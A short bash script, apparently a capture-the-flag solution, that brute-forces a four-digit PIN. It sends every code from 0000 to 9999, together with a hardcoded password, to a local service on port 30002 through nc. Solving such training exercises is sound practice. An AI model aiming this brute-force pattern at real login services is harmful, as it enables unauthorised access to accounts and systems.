#!/bin/env bash

pass="gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8"

{
for key in $(seq -w 0000 9999); do
	echo "$pass $key"
done				#{} pipes the input line by line
} | nc localhost 30002
